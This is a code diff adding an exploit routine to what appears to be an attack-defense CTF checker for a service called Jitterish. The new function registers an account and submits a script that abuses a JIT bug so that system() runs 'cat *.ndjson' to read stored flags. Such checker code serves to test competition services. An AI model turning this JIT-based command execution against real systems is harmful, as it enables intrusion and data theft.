@@ -236,6 +236,32 @@ async def exploit_jit(task: ExploitCheckerTaskMessage, logger: LoggerAdapter, se
     return searcher.search_flag(data)
 
 
+@checker.exploit(2)
+async def exploit_jit_rce(task: ExploitCheckerTaskMessage, logger: LoggerAdapter, searcher: FlagSearcher,
+                      httpclient: AsyncClient) -> str | None:
+    if task.attack_info == "":
+        raise InternalErrorException("Missing attack info")
+
+    # any account will do it
+    client = JitterishClient(logger, httpclient)
+    await client.register(generate_username(), generate_password(),
+                          generate_random_string(8, False), generate_random_string(8, False),
+                          'business')
+
+    # jit_rt_equal leaves string pointers in $rdi if both sides are the same length (alternative: jit_rt_lt).
+    # system links to libc's system
+    # return 0 ensures we get no error
+    code = '''
+    func hack() {
+        "cat *.ndjson" == "cat *.ndjson";
+        system();
+        return 0;
+    }
+    '''.strip()
+    output, result = await client.db_query(task.attack_info, code, 'hack', None)
+    return searcher.search_flag(json.dumps(output) + json.dumps(result))
+
+
 
 if __name__ == "__main__":
     # production: gunicorn -c gunicorn.conf.py "checker:app()"
